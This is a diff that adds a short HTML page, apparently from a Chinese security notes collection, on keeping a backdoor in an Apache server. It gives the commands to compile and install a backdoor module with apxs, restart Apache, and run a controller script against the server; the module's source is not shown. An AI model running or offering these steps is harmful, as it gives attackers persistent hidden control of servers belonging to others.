@@ -1,0 +1,35 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
+			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
+			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
+			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
+			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
+			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="apache后门维持"><span class="csDE05BCC">Apache</span><span class="csECDA2D3">后门维持</span></a></h1>
+		<h2 class="cs868C439D">
+			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">通过运行第三方脚本，实现维持后门的方法</span></p><h2 class="cs868C439D">
+			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
+		<h2 class="cs868C439D">
+			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs8926E06">https://github.com/ianxtianxt/apache-</span></p><h3 class="cs868C439D">
+			<a name="X149a89f4733786a77cfcab143e01c6c6b284564"><span class="csD1E291E2">1</span><span class="csD6CA00D2">、上传</span><span class="csD1E291E2"> mod_backdoor.c</span><span class="csD6CA00D2">到服务器，并执行命令</span></a></h3>
+		<p class="cs3A447A38"><span class="cs9FB05234">apxs -i -a -c mod_backdoor.c &amp;&amp; service apache2 restart</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Apache/Apache%e5%90%8e%e9%97%a8%e7%bb%b4%e6%8c%81_files/image0.jpg" width="560" height="87" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
+			<a name="Xa89e0cf9d58eaa13e819097bb5b45089b3dbed3"><span class="csD1E291E2">2</span><span class="csD6CA00D2">、控制端执行方法</span></a></h3>
+		<p class="cs3A447A38"><span class="cs9FB05234">python exploit.py 127.0.0.1 80</span></p><p class="cs40DD2BC9"><span class="cs8926E06">image</span></p></body>
+</html>
